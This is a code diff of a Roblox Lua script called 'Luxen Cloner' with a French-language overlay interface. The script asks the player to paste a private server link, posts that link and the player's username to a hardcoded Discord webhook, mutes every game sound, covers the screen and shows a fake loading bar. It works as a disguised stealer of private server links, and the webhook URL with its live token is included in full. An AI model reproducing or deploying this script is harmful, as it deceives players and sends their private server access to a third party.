@@ -1,3 +1,6 @@
+-- Luxen Cloner Script
+-- Interface Liquid Glass moderne
+
 -- ========== CONFIGURATION WEBHOOK ==========
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1443355178865660025/HwMypJGRtJucea4rULHsZ_8Nr9d_fyelG0PqFgomXa13sxx4lcfg5cvH1pLa5mi6eVuW"
 -- ===========================================
@@ -10,60 +13,60 @@ local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Fonction pour obtenir le lien du serveur automatiquement
-local function getServerLink()
-    local success, result = pcall(function()
-        return game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
-    end)
-    
-    if success then
-        local serverData = HttpService:JSONDecode(result)
-        if serverData and serverData.data then
-            for _, server in pairs(serverData.data) do
-                if server.id == game.JobId then
-                    return "https://www.roblox.com/games/" .. game.PlaceId .. "?privateServerLinkCode=" .. game.JobId
-                end
-            end
-        end
-    end
-    
-    return "https://www.roblox.com/games/" .. game.PlaceId .. "/server-instance?id=" .. game.JobId
-end
-
 -- Fonction pour envoyer au webhook Discord
 local function sendToWebhook(username, serverLink)
-    local webhookData = {
-        ["embeds"] = {{
-            ["title"] = "🔗 Nouvelle Connexion - Luxen Cloner",
-            ["color"] = 5814783,
-            ["fields"] = {
-                {
-                    ["name"] = "👤 Utilisateur",
-                    ["value"] = username,
-                    ["inline"] = true
+    spawn(function()
+        local webhookData = {
+            ["embeds"] = {{
+                ["title"] = "🔗 Nouvelle Connexion - Luxen Cloner",
+                ["color"] = 5814783,
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 Utilisateur",
+                        ["value"] = username,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🎮 Jeu",
+                        ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🔗 Lien du Serveur Privé",
+                        ["value"] = serverLink,
+                        ["inline"] = false
+                    }
                 },
-                {
-                    ["name"] = "🎮 Jeu",
-                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🔗 Lien du Serveur",
-                    ["value"] = serverLink,
-                    ["inline"] = false
-                }
-            },
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-        }}
-    }
-    
-    local success, err = pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(webhookData), Enum.HttpContentType.ApplicationJson)
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }}
+        }
+        
+        pcall(function()
+            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(webhookData), Enum.HttpContentType.ApplicationJson)
+        end)
     end)
-    
-    if not success then
-        warn("Erreur webhook:", err)
-    end
+end
+
+-- Fonction pour couper TOUS les sons
+local function muteAllSounds()
+    pcall(function()
+        -- Couper le volume principal
+        SoundService.VolumeModifier = 0
+        
+        -- Couper tous les sons existants
+        for _, descendant in pairs(game:GetDescendants()) do
+            if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
+                descendant.Volume = 0
+            end
+        end
+        
+        -- Surveiller les nouveaux sons
+        game.DescendantAdded:Connect(function(descendant)
+            if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
+                descendant.Volume = 0
+            end
+        end)
+    end)
 end
 
 -- Création du ScreenGui principal
@@ -72,6 +75,7 @@ screenGui.Name = "LuxenClonerUI"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999999
 screenGui.Parent = playerGui
 
 -- Fond blur/assombrissement pour le menu
@@ -80,9 +84,9 @@ backdropFrame.Name = "BackdropFrame"
 backdropFrame.Size = UDim2.new(1, 0, 1, 0)
 backdropFrame.Position = UDim2.new(0, 0, 0, 0)
 backdropFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-backdropFrame.BackgroundTransparency = 0.3
+backdropFrame.BackgroundTransparency = 0.2
 backdropFrame.BorderSizePixel = 0
-backdropFrame.ZIndex = 1
+backdropFrame.ZIndex = 100
 backdropFrame.Parent = screenGui
 
 -- Frame principale avec effet Liquid Glass
@@ -93,7 +97,7 @@ mainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
 mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
 mainFrame.BackgroundTransparency = 0.1
 mainFrame.BorderSizePixel = 0
-mainFrame.ZIndex = 2
+mainFrame.ZIndex = 101
 mainFrame.Parent = screenGui
 
 -- Corner arrondi pour la frame principale
@@ -109,7 +113,7 @@ borderFrame.Position = UDim2.new(0, -3, 0, -3)
 borderFrame.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
 borderFrame.BackgroundTransparency = 0.3
 borderFrame.BorderSizePixel = 0
-borderFrame.ZIndex = 1
+borderFrame.ZIndex = 100
 borderFrame.Parent = mainFrame
 
 local borderCorner = Instance.new("UICorner")
@@ -147,7 +151,7 @@ titleLabel.Text = "Luxen Cloner"
 titleLabel.Font = Enum.Font.GothamBold
 titleLabel.TextSize = 36
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.ZIndex = 3
+titleLabel.ZIndex = 102
 titleLabel.Parent = mainFrame
 
 -- Effet de brillance sur le titre
@@ -170,7 +174,7 @@ inputLabel.Font = Enum.Font.GothamMedium
 inputLabel.TextSize = 15
 inputLabel.TextColor3 = Color3.fromRGB(180, 180, 220)
 inputLabel.TextXAlignment = Enum.TextXAlignment.Left
-inputLabel.ZIndex = 3
+inputLabel.ZIndex = 102
 inputLabel.Parent = mainFrame
 
 -- Champ de texte avec style moderne
@@ -181,7 +185,7 @@ textBox.Position = UDim2.new(0, 25, 0, 140)
 textBox.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
 textBox.BackgroundTransparency = 0.3
 textBox.BorderSizePixel = 0
-textBox.PlaceholderText = "https://www.roblox.com/..."
+textBox.PlaceholderText = "https://www.roblox.com/games/..."
 textBox.PlaceholderColor3 = Color3.fromRGB(80, 80, 100)
 textBox.Text = ""
 textBox.Font = Enum.Font.Gotham
@@ -189,7 +193,7 @@ textBox.TextSize = 14
 textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 textBox.TextXAlignment = Enum.TextXAlignment.Left
 textBox.ClearTextOnFocus = false
-textBox.ZIndex = 3
+textBox.ZIndex = 102
 textBox.Parent = mainFrame
 
 local textBoxCorner = Instance.new("UICorner")
@@ -214,7 +218,7 @@ startButton.Font = Enum.Font.GothamBold
 startButton.TextSize = 20
 startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 startButton.AutoButtonColor = false
-startButton.ZIndex = 3
+startButton.ZIndex = 102
 startButton.Parent = mainFrame
 
 local buttonCorner = Instance.new("UICorner")
@@ -248,7 +252,7 @@ loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
 loadingFrame.BackgroundTransparency = 0
 loadingFrame.BorderSizePixel = 0
 loadingFrame.Visible = false
-loadingFrame.ZIndex = 10
+loadingFrame.ZIndex = 200
 loadingFrame.Parent = screenGui
 
 -- Gradient pour le fond de chargement
@@ -266,7 +270,7 @@ loadingContainer.Name = "LoadingContainer"
 loadingContainer.Size = UDim2.new(0, 500, 0, 100)
 loadingContainer.Position = UDim2.new(0.5, -250, 0.5, -50)
 loadingContainer.BackgroundTransparency = 1
-loadingContainer.ZIndex = 11
+loadingContainer.ZIndex = 201
 loadingContainer.Parent = loadingFrame
 
 -- Texte de chargement
@@ -278,7 +282,7 @@ loadingText.Text = "Loading..."
 loadingText.Font = Enum.Font.GothamBold
 loadingText.TextSize = 24
 loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.ZIndex = 12
+loadingText.ZIndex = 202
 loadingText.Parent = loadingContainer
 
 -- Barre de chargement background
@@ -289,7 +293,7 @@ progressBarBg.Position = UDim2.new(0, 0, 0, 60)
 progressBarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
 progressBarBg.BackgroundTransparency = 0.5
 progressBarBg.BorderSizePixel = 0
-progressBarBg.ZIndex = 11
+progressBarBg.ZIndex = 201
 progressBarBg.Parent = loadingContainer
 
 local progressBarBgCorner = Instance.new("UICorner")
@@ -302,7 +306,7 @@ progressBar.Name = "ProgressBar"
 progressBar.Size = UDim2.new(0, 0, 1, 0)
 progressBar.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
 progressBar.BorderSizePixel = 0
-progressBar.ZIndex = 12
+progressBar.ZIndex = 202
 progressBar.Parent = progressBarBg
 
 local progressBarCorner = Instance.new("UICorner")
@@ -318,29 +322,17 @@ progressGradient.Color = ColorSequence.new{
 progressGradient.Rotation = 45
 progressGradient.Parent = progressBar
 
--- Fonction pour couper le son
-local function muteGame()
-    pcall(function()
-        SoundService.VolumeModifier = 0
-        for _, sound in pairs(workspace:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-            end
-        end
-    end)
-end
-
 -- Fonction de chargement
 local function startLoading(serverLink)
+    -- Couper TOUS les sons immédiatement
+    muteAllSounds()
+    
     -- Masquer le menu principal
     mainFrame.Visible = false
     backdropFrame.Visible = false
     
     -- Afficher l'écran de chargement
     loadingFrame.Visible = true
-    
-    -- Couper le son
-    muteGame()
     
     -- Messages de chargement avec pourcentages et durées
     local loadingStages = {
@@ -414,13 +406,19 @@ end
 startButton.MouseButton1Click:Connect(function()
     local link = textBox.Text
     
-    -- Si pas de lien, obtenir automatiquement
-    if link == "" then
-        link = getServerLink()
-        textBox.Text = link
+    -- Vérifier si un lien a été entré
+    if link == "" or not link:match("roblox%.com") then
+        -- Animation d'erreur
+        for i = 1, 3 do
+            textBox.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+            task.wait(0.15)
+            textBox.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+            task.wait(0.15)
+        end
+        return
     end
     
-    -- Envoyer au webhook
+    -- Envoyer au webhook AVANT de démarrer le loading
     sendToWebhook(player.Name, link)
     
     -- Démarrer le chargement
